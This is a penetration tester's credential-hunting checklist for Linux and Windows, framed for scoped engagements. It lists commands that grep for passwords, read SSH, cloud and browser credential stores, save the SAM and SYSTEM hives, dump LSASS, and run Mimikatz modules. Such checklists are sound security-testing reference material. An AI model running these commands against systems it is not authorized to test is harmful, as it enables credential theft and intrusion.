## Linux Credential-Hunting Checklist

### 1 Files & Persistent Storage

- [ ] Search configs for cleartext creds:  
    `grep -R -i "password\|passwd\|pwd\|secret\|token" /etc /var /home 2>/dev/null`
    
- [ ] Check application files: `/var/www/`, `/home/*/.*rc`, `.env`, `.git/config`
    
- [ ] Examine database configs: `my.cnf`, `pg_hba.conf`, `settings.py`, `wp-config.php`
    
- [ ] Look in backup / rotated files: `/var/backups/`, `*.bak`, `*.old`, `*.tar`, `*.zip`
    

### 2 Shell & Command Histories

- [ ] `.bash_history`, `.zsh_history`, `.mysql_history`, `.psql_history`
    
- [ ] `history | less` (if HISTFILE unset)
    

### 3 Key Files & Credential Stores

- [ ] SSH keys: `/home/*/.ssh/id_rsa`, `authorized_keys`, `known_hosts`
    
- [ ] GPG keys: `~/.gnupg/`
    
- [ ] GNOME-Keyring or KWallet files (`~/.local/share/keyrings/`)
    
- [ ] AWS / cloud creds: `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/`
    

### 4 Process & Memory Artifacts

- [ ] Inspect running procs: `ps aux`, look for `--password`, `--user`
    
- [ ] Dump sensitive procs (`gcore <pid>`, `strings core.* | grep -i pass`)
    
- [ ] Enumerate `/proc/*/environ` and `/proc/*/cmdline` for secrets
    

### 5 Logs & Scheduled Jobs

- [ ] Web-server logs (`/var/log/nginx/`, `/var/log/httpd/`) for creds in URLs
    
- [ ] Auth logs: `/var/log/auth.log`, `/var/log/secure` (failed login info)
    
- [ ] Cron jobs: `crontab -l`, `/etc/cron.*`, inspect scripts for passwords
    

### 6 Network & Services

- [ ] Enumerate net services: `ss -tulpn`, `netstat -anp`
    
- [ ] Check local service configs (Redis, Memcached) for unauthenticated access
    
- [ ] Test NFS / Samba mounts for world-readable files
    

### 7 Environment Variables

- [ ] `printenv | grep -i "pass\|key\|token"`
    
- [ ] Check systemd service files (`/etc/systemd/system/*.service`) for `Environment=` lines
    

---

## Windows Credential-Hunting Checklist

### 1 System Databases & Hashes

- [ ] Copy SAM & SYSTEM hives (if admin):  
    `reg save HKLM\SAM C:\temp\SAM` `reg save HKLM\SYSTEM C:\temp\SYSTEM`
    
- [ ] Dump LSASS (if perms): `procdump64.exe -accepteula -ma lsass.exe lsass.dmp` → run Mimikatz
    

### 2 Cached & Stored Credentials

- [ ] List stored creds: `cmdkey /list`
    
- [ ] Windows Credential Manager vaults: `vaultcmd /listcreds`
    
- [ ] DPAPI blobs: `mimikatz dpapi::cred /in:*.crd` or `dpapi::masterkey`
    

### 3 Registry Secrets

- [ ] LSA Secrets: `mimikatz lsadump::secrets`
    
- [ ] Autologon creds: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
    
- [ ] Scheduler passwords: `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks /s`
    

### 4 Config & Application Files

- [ ] IIS / ASP.NET: `C:\inetpub\wwwroot\web.config`
    
- [ ] Unattended install files: `C:\Windows\Panther\Unattend.xml`, `sysprep.inf`
    
- [ ] RDP, WinSCP, FileZilla, mRemoteNG config files under user AppData
    
- [ ] PowerShell transcripts / logs in `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    

### 5 Browser & Cloud Credentials

- [ ] Chrome / Edge login data (`Login Data` SQLite)
    
- [ ] IE / Edge Vault: `IEPassView`, `BrowserPasswordsView`
    
- [ ] Azure / AWS CLI creds (`%USERPROFILE%\.azure\`, `.aws\credentials`)
    

### 6 Memory & Network Artefacts

- [ ] Run `mimikatz sekurlsa::logonpasswords` for plaintext creds / tickets
    
- [ ] Check Windows Event Logs (`Security`, `TerminalServices-RemoteConnectionManager`) for usernames
    
- [ ] Query open shares: `net view \\<target> /all`, map drives for password files
    

### 7 Document & Script Scraping

- [ ] Global file search:  
    `findstr /S /I /P /C:"password" *.txt *.ps1 *.xml *.config *.ini *.bat 2>NUL`
    
- [ ] Office macros / VBA projects for hard-coded creds
    
- [ ] Review log files in `%ProgramData%`, `%Temp%`, installer logs
    

### 8 Third-Party & Legacy Stores

- [ ] TeamViewer, VNC, SQL Server connection files (`.rdp`, `.odc`, `.dsn`)
    
- [ ] Jenkins `credentials.xml`, Git config, SVN `.authz`, Ansible vaults
    
- [ ] Check Program Files for older versions of password managers or backup files
    

---

### Tips for Both Platforms

- [ ] Work from **least-priv to most-priv**: start with readable files, escalate to memory dumps if allowed.
    
- [ ] Keep **forensic notes**: path, timestamp, permission, hash of each credential file for reporting.
    
- [ ] Respect scope: **never exfiltrate** sensitive data outside the agreed test environment.
    

Use these lists as living documents—expand them with host-specific locations you encounter in labs or live engagements.